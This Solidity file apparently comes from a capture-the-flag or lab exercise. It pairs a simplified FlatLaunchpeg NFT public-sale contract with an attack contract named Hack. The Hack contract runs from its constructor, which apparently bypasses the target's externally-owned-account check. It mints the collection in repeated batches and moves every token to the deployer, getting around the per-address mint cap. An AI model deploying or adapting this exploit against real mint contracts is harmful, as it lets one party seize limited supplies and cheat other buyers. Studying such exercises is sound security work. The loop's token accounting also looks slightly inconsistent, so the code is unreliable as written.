// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./BaseLaunchpegNFT.sol";

/// @dev hopegs NFT exchange wrapper to manage mint
contract FlatLaunchpeg is BaseLaunchpegNFT {
    enum Phase {
        NotStarted,
        PublicSale
    }

    modifier atPhase(Phase _phase) {
        if (currentPhase() != _phase) {
            revert Launchpeg__WrongPhase();
        }
        _;
    }

    constructor(
        uint256 _collectionSize,
        uint256 _maxBatchSize,
        uint256 _maxPerAddressDuringMint
    )
        BaseLaunchpegNFT(
            _collectionSize,
            _maxBatchSize,
            _maxPerAddressDuringMint
        )
    {}

    /// @notice Mint NFTs during the public sale
    /// @param _quantity Quantity of NFTs to mint
    function publicSaleMint(
        uint256 _quantity
    ) external payable isEOA atPhase(Phase.PublicSale) {
        if (numberMinted(msg.sender) + _quantity > maxPerAddressDuringMint) {
            revert Launchpeg__CanNotMintThisMany();
        }
        if (totalSupply() + _quantity > collectionSize) {
            revert Launchpeg__MaxSupplyReached();
        }
        uint256 total = salePrice * _quantity;

        _mintForUser(msg.sender, _quantity);
        _refundIfOver(total);
    }

    /// @notice Returns the current phase
    /// @return phase Current phase
    function currentPhase() public view returns (Phase) {
        if (publicSaleStartTime == 0 || block.timestamp < publicSaleStartTime) {
            return Phase.NotStarted;
        } else {
            return Phase.PublicSale;
        }
    }
}

import "forge-std/console.sol";

contract Hack {
    // FlatLaunchpeg public target;

    constructor(address _target) {
        FlatLaunchpeg target = FlatLaunchpeg(_target);

        // Total Supply of Nft Minted
        uint256 totalSupply = target.totalSupply();

        // Nft Collection Size
        uint256 collectionSize = target.collectionSize();

        // Max Batch Size
        uint256 maxBatchSize = target.maxBatchSize();

        // Sale Price
        uint256 salePrice = target.salePrice();

        uint256 lastTokenId;

        while (collectionSize > maxBatchSize) {
            uint amountToMint = maxBatchSize;
            target.publicSaleMint{value: salePrice * amountToMint}(
                amountToMint
            );

            // Transfer Nft to Attacker
            for (uint i; i < amountToMint; ++i) {
                uint256 tokenId = lastTokenId + i;
                target.safeTransferFrom(address(this), msg.sender, tokenId);
            }
            lastTokenId += amountToMint;
            collectionSize = collectionSize - maxBatchSize;
        }
        // Mint Any Left Out Nfts
        if (collectionSize - totalSupply > 0) {
            uint256 nftLeft = collectionSize - totalSupply;
            target.publicSaleMint{value: salePrice * nftLeft}(nftLeft);
            for (uint i; i < nftLeft; ++i) {
                uint256 tokenId = lastTokenId + i;
                target.safeTransferFrom(address(this), msg.sender, tokenId);
            }
        }
    }
}
